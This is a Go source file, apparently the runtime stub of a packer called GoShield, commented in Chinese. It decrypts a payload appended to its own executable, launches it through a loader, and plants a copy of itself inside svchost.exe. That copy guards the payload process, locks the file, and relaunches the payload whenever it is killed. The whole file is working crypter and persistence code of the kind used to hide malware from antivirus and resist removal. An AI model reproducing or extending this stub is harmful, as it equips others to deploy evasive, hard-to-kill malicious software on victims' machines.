// 文件路径: stub/main.go
package main

import (
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"strconv"
	"syscall"
	"unsafe"

	"github.com/Limkon/GoShield/internal/crypto"
	"github.com/Limkon/GoShield/internal/loader"
	"github.com/Limkon/GoShield/internal/protect"
)

// extractAndDecrypt 提取并解密 Payload 的复用核心函数
func extractAndDecrypt(exePath string) ([]byte, error) {
	file, err := os.Open(exePath)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	stat, err := file.Stat()
	if err != nil {
		return nil, err
	}
	fileSize := stat.Size()

	footerSize := int64(48)
	if fileSize < footerSize {
		return nil, fmt.Errorf("no payload")
	}

	file.Seek(-footerSize, io.SeekEnd)
	footer := make([]byte, footerSize)
	io.ReadFull(file, footer)

	if string(footer[40:48]) != "GOSHIELD" {
		return nil, fmt.Errorf("magic error")
	}

	key := footer[0:32]
	payloadSize := binary.LittleEndian.Uint64(footer[32:40])

	if fileSize < footerSize+int64(payloadSize) {
		return nil, fmt.Errorf("size error")
	}

	file.Seek(-(footerSize + int64(payloadSize)), io.SeekEnd)
	encryptedPayload := make([]byte, payloadSize)
	io.ReadFull(file, encryptedPayload)

	return crypto.Decrypt(encryptedPayload, key)
}

func main() {
	exePath, err := os.Executable()
	if err != nil {
		os.Exit(1)
	}

	// 🌟 1. 终极分流：判断当前是否是潜伏在 svchost.exe 中的幽灵保镖
	shadowPIDStr := os.Getenv("GOSHIELD_SHADOW_PID")
	if shadowPIDStr != "" {
		// ==========================================
		// === 幽灵保镖逻辑 (此时运行在 svchost.exe 内存中) ===
		// ==========================================
		protect.ProtectProcess()
		originalExe := os.Getenv("GOSHIELD_ORIGINAL_EXE")
		protect.LockFile(originalExe)

		targetPID, _ := strconv.Atoi(shadowPIDStr)
		
		kernel32 := syscall.NewLazyDLL("kernel32.dll")
		procOpenProcess := kernel32.NewProc("OpenProcess")
		procWaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
		procGetExitCodeProcess := kernel32.NewProc("GetExitCodeProcess")
		procCloseHandle := kernel32.NewProc("CloseHandle")

		for {
			// 尝试打开刚被父进程光速拉起的业务进程的句柄
			hProcess, _, _ := procOpenProcess.Call(0x00100000|0x0400, 0, uintptr(targetPID))
			if hProcess != 0 {
				// 阻塞死守，保镖进入休眠状态
				procWaitForSingleObject.Call(hProcess, 0xFFFFFFFF)
				var exitCode uint32
				procGetExitCodeProcess.Call(hProcess, uintptr(unsafe.Pointer(&exitCode)))
				procCloseHandle.Call(hProcess)

				// ExitCode 为 0 表示用户正常退出程序，保镖功成身退
				if exitCode == 0 {
					break
				}
			}

			// 如果执行到这里，说明业务进程被非法强杀，或者没打开句柄 => 立刻原地复活！
			decryptedPayload, err := extractAndDecrypt(originalExe)
			if err != nil {
				break // 原文件被破坏，终止复活
			}
			
			newPID, err := loader.ExecuteAsync(originalExe, decryptedPayload)
			if err != nil {
				break // 底层拦截，终止复活
			}
			targetPID = int(newPID) // 更新监控目标，进入下一轮轮回
		}
		os.Exit(0)
	}

	// ==========================================
	// === 原始父进程逻辑 (用户双击运行时的第一瞬间) ===
	// ==========================================
	
	decryptedPayload, err := extractAndDecrypt(exePath)
	if err != nil {
		os.Exit(1)
	}

	// 🌟 核心提速点：父进程亲自、立刻、极速启动真实的业务程序！
	// 不再做任何中转，解密完成的一瞬间直接在屏幕上弹出真实程序。
	payloadPID, err := loader.ExecuteAsync(exePath, decryptedPayload)
	if err != nil {
		os.Exit(1)
	}

	// 并行：在业务程序已经在运行的同时，顺手把幽灵保镖扔到后台去
	myExeBytes, err := os.ReadFile(exePath)
	if err == nil {
		os.Setenv("GOSHIELD_SHADOW_PID", strconv.Itoa(int(payloadPID))) // 把业务进程的 PID 交给保镖
		os.Setenv("GOSHIELD_ORIGINAL_EXE", exePath)
		loader.ExecuteAsync("C:\\Windows\\System32\\svchost.exe", myExeBytes)
	}

	// 父进程献祭，深藏功与名
	os.Exit(0)
}
